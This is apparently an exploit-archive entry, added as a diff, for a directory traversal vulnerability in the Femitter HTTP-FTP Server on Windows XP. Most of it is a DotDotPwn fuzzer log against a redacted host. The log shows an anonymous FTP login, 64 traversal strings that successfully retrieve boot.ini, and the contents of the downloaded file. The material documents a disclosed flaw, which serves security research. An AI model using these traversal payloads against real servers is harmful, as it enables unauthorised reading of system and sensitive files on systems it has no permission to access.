@@ -1,0 +1,198 @@
+# Exploit Title: Fermitter Server FTP Directory Traversal
+# Date: Nov 06, 2010
+# Author: chr1x
+# Software Link: http://acritum.com/software/dist/fem-dist.exe
+# Description: Acritum Femitter HTTP-FTP Server is an easy-to use HTTP and FTP server application for Windows which allows you to use your own computer for sharing gigabytes of files with your friends and colleagues. No need to pay for expensive hosting! No need to spend hours to upload your files to a remote server!
+# Tested on: Windows XP SP3 (Spanish Edition)
+
+
+root@voltron:/dotdotpwn-v2.1# perl dotdotpwn.pl -h XXX.XXX.X.XX -m ftp -t 300 -f boot.ini -s -q -k timeout
+#################################################################################
+#                                                                               #
+#  CubilFelino                                                       Chatsubo   #
+#  Security Research Lab              and            [(in)Security Dark] Labs   #
+#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
+#                                                                               #
+#                               pr0udly present:                                #
+#                                                                               #
+#  ________            __  ________            __  __________                   #
+#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
+#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
+#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
+#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
+#          \/                      \/                                      \/   #
+#                               - DotDotPwn v2.1 -                              #
+#                         The Traversal Directory Fuzzer                        #
+#                         http://dotdotpwn.sectester.net                        #
+#                            dotdotpwn@sectester.net                            #
+#                                                                               #
+#                              by chr1x & nitr0us                               #
+#################################################################################
+
+
+[========== TARGET INFORMATION ==========]
+[+] Hostname: XXX.XXX.X.XX
+[+] Protocol: ftp
+[+] Port: 21
+[+] Service detected:
+220 Femitter FTP Server ready.
+
+[=========== TRAVERSAL ENGINE ===========]
+[+] Creating Traversal patterns (mix of dots and slashes)
+[+] Permuting 6 times the traversal patterns (-d switch)
+[+] Creating the Special Traversal patterns
+[+] Translating (back)slashes in the filenames
+[+] Appending 'boot.ini' to the Traversal Strings
+[+] Including Special sufixes
+[+] Traversal Engine DONE ! - Total traversal tests created: 1164
+
+[=========== TESTING RESULTS ============]
+[+] Ready to launch 3.33 traversals per second
+[+] Press any key to start the testing (You can stop it pressing Ctrl + C)
+
+[+] Username: anonymous
+[+] Password: dot@dot.pwn
+[+] Connecting to the FTP server at 'XXX.XXX.X.XX' on port 21
+[+] FTP Server's Current Path: /C:/Archivos de programa/Femitter/Shared
+[+] Local Path to download files: /dotdotpwn-v2.1/retrieved_files
+[+] Press any key to continue
+
+[+] Testing ...
+. 
+[*] GET ../../../boot.ini <- VULNERABLE!
+
+[*] GET ../../../../boot.ini <- VULNERABLE!
+
+[*] GET ../../../../../boot.ini <- VULNERABLE!
+
+[*] GET ../../../../../../boot.ini <- VULNERABLE!
+
+[*] GET ..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET ..\..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET ..\..\..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET ..\..\..\..\..\..\boot.ini <- VULNERABLE!
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+[*] GET ..//..//..//boot.ini <- VULNERABLE!
+
+[*] GET ..//..//..//..//boot.ini <- VULNERABLE!
+
+[*] GET ..//..//..//..//..//boot.ini <- VULNERABLE!
+
+[*] GET ..//..//..//..//..//..//boot.ini <- VULNERABLE!
+
+[*] GET ..///..///..///boot.ini <- VULNERABLE!
+
+[*] GET ..///..///..///..///boot.ini <- VULNERABLE!
+
+[*] GET ..///..///..///..///..///boot.ini <- VULNERABLE!
+
+[*] GET ..///..///..///..///..///..///boot.ini <- VULNERABLE!
+
+[*] GET ..\\..\\..\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\..\\..\\..\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\..\\..\\..\\..\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\..\\..\\..\\..\\..\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\\..\\\..\\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\\..\\\..\\\..\\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\\..\\\..\\\..\\\..\\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\\..\\\..\\\..\\\..\\\..\\\boot.ini <- VULNERABLE!
+. 
+[*] GET ../\../\../\boot.ini <- VULNERABLE!
+
+[*] GET ../\../\../\../\boot.ini <- VULNERABLE!
+
+[*] GET ../\../\../\../\../\boot.ini <- VULNERABLE!
+
+[*] GET ../\../\../\../\../\../\boot.ini <- VULNERABLE!
+
+[*] GET ..\/..\/..\/boot.ini <- VULNERABLE!
+
+[*] GET ..\/..\/..\/..\/boot.ini <- VULNERABLE!
+
+[*] GET ..\/..\/..\/..\/..\/boot.ini <- VULNERABLE!
+
+[*] GET ..\/..\/..\/..\/..\/..\/boot.ini <- VULNERABLE!
+
+[*] GET ../\/../\/../\/boot.ini <- VULNERABLE!
+
+[*] GET ../\/../\/../\/../\/boot.ini <- VULNERABLE!
+
+[*] GET ../\/../\/../\/../\/../\/boot.ini <- VULNERABLE!
+
+[*] GET ../\/../\/../\/../\/../\/../\/boot.ini <- VULNERABLE!
+
+[*] GET ..\/\..\/\..\/\boot.ini <- VULNERABLE!
+
+[*] GET ..\/\..\/\..\/\..\/\boot.ini <- VULNERABLE!
+
+[*] GET ..\/\..\/\..\/\..\/\..\/\boot.ini <- VULNERABLE!
+
+[*] GET ..\/\..\/\..\/\..\/\..\/\..\/\boot.ini <- VULNERABLE!
+
+[*] GET \../\../\../boot.ini <- VULNERABLE!
+
+[*] GET \../\../\../\../boot.ini <- VULNERABLE!
+
+[*] GET \../\../\../\../\../boot.ini <- VULNERABLE!
+
+[*] GET \../\../\../\../\../\../boot.ini <- VULNERABLE!
+. 
+[*] GET /..\/..\/..\boot.ini <- VULNERABLE!
+
+[*] GET /..\/..\/..\/..\boot.ini <- VULNERABLE!
+
+[*] GET /..\/..\/..\/..\/..\boot.ini <- VULNERABLE!
+
+[*] GET /..\/..\/..\/..\/..\/..\boot.ini <- VULNERABLE!
+. 
+[*] GET ./.././.././../boot.ini <- VULNERABLE!
+
+[*] GET ./.././.././.././../boot.ini <- VULNERABLE!
+
+[*] GET ./.././.././.././.././../boot.ini <- VULNERABLE!
+
+[*] GET ./.././.././.././.././.././../boot.ini <- VULNERABLE!
+
+[*] GET .\..\.\..\.\..\boot.ini <- VULNERABLE!
+
+[*] GET .\..\.\..\.\..\.\..\boot.ini <- VULNERABLE!
+
+[*] GET .\..\.\..\.\..\.\..\.\..\boot.ini <- VULNERABLE!
+
+[*] GET .\..\.\..\.\..\.\..\.\..\.\..\boot.ini <- VULNERABLE!
+
+[*] GET .//..//.//..//.//..//boot.ini <- VULNERABLE!
+
+[*] GET .//..//.//..//.//..//.//..//boot.ini <- VULNERABLE!
+
+[*] GET .//..//.//..//.//..//.//..//.//..//boot.ini <- VULNERABLE!
+
+[*] GET .//..//.//..//.//..//.//..//.//..//.//..//boot.ini <- VULNERABLE!
+. 
+[*] GET .\\..\\.\\..\\.\\..\\boot.ini <- VULNERABLE!
+
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\boot.ini <- VULNERABLE!
+
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini <- VULNERABLE!
+
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini <- VULNERABLE!
+. . . . . . . . . . 
+[+] Fuzz testing finished after 6.13 minutes (368 seconds)
+[+] Total Traversals found: 64
+root@voltron:/dotdotpwn-v2.1# cat ./retrieved_files/boot.ini 
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+root@voltron:/dotdotpwn-v2.1# 
